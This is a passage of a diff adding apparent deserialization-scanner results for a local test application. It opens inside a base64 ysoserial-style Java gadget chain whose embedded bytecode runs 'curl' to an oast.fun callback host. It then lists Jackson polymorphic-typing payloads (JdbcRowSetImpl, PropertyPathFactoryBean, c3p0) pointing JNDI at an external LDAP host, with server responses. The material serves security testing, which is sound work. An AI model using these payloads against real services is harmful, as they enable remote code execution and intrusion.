GlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHZ2V0VHlwZXN9AAAAAgAWamF2YS5sYW5nLnJlZmxlY3QuVHlwZQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cQB+AAZzcgBgb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuQXV0b3dpcmVVdGlscyRPYmplY3RGYWN0b3J5RGVsZWdhdGluZ0ludm9jYXRpb25IYW5kbGVyhWLLwAz9MRMCAAFMAA1vYmplY3RGYWN0b3J5dAAxTG9yZy9zcHJpbmdmcmFtZXdvcmsvYmVhbnMvZmFjdG9yeS9PYmplY3RGYWN0b3J5O3hwc30AAAABAC9vcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3RvcnkuT2JqZWN0RmFjdG9yeXhxAH4ABnNxAH4ACXNxAH4ADT9AAAAAAAAMdwgAAAAQAAAAAXQACWdldE9iamVjdHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AAUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAG2cr+ur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAEdjdXJsIGh0dHA6Ly9uenNtem10eWZoem5rc3N5eXNldzUwbHg1c2l5b3I2M3Iub2FzdC5mdW4vY2MtcmNlLWNvbmZpcm1lZAgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHHlzb3NlcmlhbC9Qd25lcjQwNDMwNzk3MzU3ODkBAB5MeXNvc2VyaWFsL1B3bmVyNDA0MzA3OTczNTc4OTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ACEAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHhxAH4AJg==",
+          "payload_type": "java_rce_escalation"
+        }
+      ],
+      "confidence": "Medium",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Java Deserialization — Unknown Gadget",
+      "indicators": [
+        "Response content differs in a small, localized way despite same status/length (similarity=0.81) (baseline='{\"receivedType\":\"java.lang.String\",\"success\":true}' mutated='{\"receivedType\":\"java.util.HashMap\",\"success\":true}')"
+      ],
+      "likely_vulnerable": true,
+      "location": "raw_body",
+      "method": "POST",
+      "mutations_count": 7,
+      "name": "payload",
+      "normalized": [
+        "¬í\u0000\u0005t\u0000\u0005hello"
+      ],
+      "notes": "Java serialized object detected but no known gadget chain found | Suggest: use URLDNS probe first to confirm deserialization | Then try common chains: CommonsCollections, Spring, Groovy",
+      "risk_level": "High",
+      "severity": "Low",
+      "subtype": null,
+      "suggested_probe": "urldns_probe",
+      "type": "Java",
+      "url": "http://localhost:8081/api/integration/receive"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.sun.rowset.JdbcRowSetImpl",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=645",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.sun.rowset.JdbcRowSetImpl' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"email alerts\\\",\\\"channel\\\":[\\\"com.sun.rowset.JdbcRowSetImpl\\\",{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]}\\\"; line: 1, column: 68] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 645,
+            "status": 400
+          },
+          "payload": "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=881",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'org.springframework.beans.factory.config.PropertyPathFactoryBean' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"email alerts\\\",\\\"channel\\\":[\\\"org.springframework.beans.factory.config.PropertyPathFactoryBean\\\",{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]}\\\"; line: 1, column: 103] (through ",
+            "length": 881,
+            "status": 400
+          },
+          "payload": "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=560",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.mchange.v2.c3p0.JndiRefForwardingDataSource' as a subtype of `java.lang.Object`: no such class found\\n at [Source: (String)\\\"{\\\"label\\\":\\\"email alerts\\\",\\\"channel\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"loginTimeout\\\":\\\"0\\\"}]}\\\"; line: 1, column: 86] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 560,
+            "status": 400
+          },
+          "payload": "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=598",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.rowset.JdbcRowSetImpl`: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"email alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\\\",[{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]]}\\\"; line: 1, column: 89] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 598,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\",[{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=869",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `org.springframework.beans.factory.config.PropertyPathFactoryBean`: Illegal type (org.springframework.beans.factory.config.PropertyPathFactoryBean) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"email alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\\\",[{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]]}\\\"; line: 1, column: 124] (through reference ch",
+            "length": 869,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\",[{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.EmailChannel\",\"label\":\"email alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=423",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.JsonMappingException: Failed to parse type 'java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>' (remaining: '>'): Cannot locate class 'com.mchange.v2.c3p0.JndiRefForwardingDataSource', problem: com.mchange.v2.c3p0.JndiRefForwardingDataSource (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 423,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>\",[{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]]",
+          "payload_type": "jackson_oob"
+        }
+      ],
+      "confidence": "Medium",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Jackson Polymorphic Deserialization",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=400",
+        "Response length changed significantly: baseline=104 mutated=645",
+        "Error/exception disclosure in response: ['exception']"
+      ],
+      "likely_vulnerable": true,
+      "location": "raw_body",
+      "method": "POST",
+      "mutations_count": 6,
+      "name": "payload",
+      "normalized": [
+        "[\"com.webvulenv.javaapp.model.webhook.EmailChannel\",{\"address\":\"ops@acme-portal.test\"}]",
+        "¦ÞéV¥z»lr\u0016§é\\¢l\u001enû¥z{ãjö¦¨uépy¸h¢A&j)B©çzVv·¬²liÉú+µ©mzË"
+      ],
+      "notes": "Jackson default/polymorphic typing JSON detected (WRAPPER_ARRAY [\"class\",{...}] or @class/@type) — the application likely calls ObjectMapper.enableDefaultTyping()/activateDefaultTyping() | Not auto-exploited: generate a gadget JSON manually with marshalsec (marshalsec.Jackson) against a known gadget (e.g. JdbcRowSetImpl + JNDI), then replay and review the response",
+      "risk_level": "High",
+      "severity": "High",
+      "subtype": "Jackson Polymorphic Typing",
+      "suggested_probe": "jackson_manual",
+      "type": "Java",
+      "url": "http://localhost:8081/api/webhook/config"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.sun.rowset.JdbcRowSetImpl",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=645",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.sun.rowset.JdbcRowSetImpl' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"com.sun.rowset.JdbcRowSetImpl\\\",{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]}\\\"; line: 1, column: 68] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 645,
+            "status": 400
+          },
+          "payload": "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=881",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'org.springframework.beans.factory.config.PropertyPathFactoryBean' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"org.springframework.beans.factory.config.PropertyPathFactoryBean\\\",{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]}\\\"; line: 1, column: 103] (through ",
+            "length": 881,
+            "status": 400
+          },
+          "payload": "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=560",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.mchange.v2.c3p0.JndiRefForwardingDataSource' as a subtype of `java.lang.Object`: no such class found\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"loginTimeout\\\":\\\"0\\\"}]}\\\"; line: 1, column: 86] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 560,
+            "status": 400
+          },
+          "payload": "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=598",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.rowset.JdbcRowSetImpl`: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\\\",[{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]]}\\\"; line: 1, column: 89] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 598,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\",[{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=869",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `org.springframework.beans.factory.config.PropertyPathFactoryBean`: Illegal type (org.springframework.beans.factory.config.PropertyPathFactoryBean) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\\\",[{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]]}\\\"; line: 1, column: 124] (through reference ch",
+            "length": 869,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\",[{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=423",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.JsonMappingException: Failed to parse type 'java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>' (remaining: '>'): Cannot locate class 'com.mchange.v2.c3p0.JndiRefForwardingDataSource', problem: com.mchange.v2.c3p0.JndiRefForwardingDataSource (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 423,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>\",[{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]]",
+          "payload_type": "jackson_oob"
+        }
+      ],
+      "confidence": "Medium",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Jackson Polymorphic Deserialization",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=400",
+        "Response length changed significantly: baseline=104 mutated=645",
+        "Error/exception disclosure in response: ['exception']"
+      ],
+      "likely_vulnerable": true,
+      "location": "raw_body",
+      "method": "POST",
+      "mutations_count": 6,
+      "name": "payload",
+      "normalized": [
+        "[\"com.webvulenv.javaapp.model.webhook.SlackChannel\",{\"webhookUrl\":\"https://hooks.slack.com/services/...\"}]",
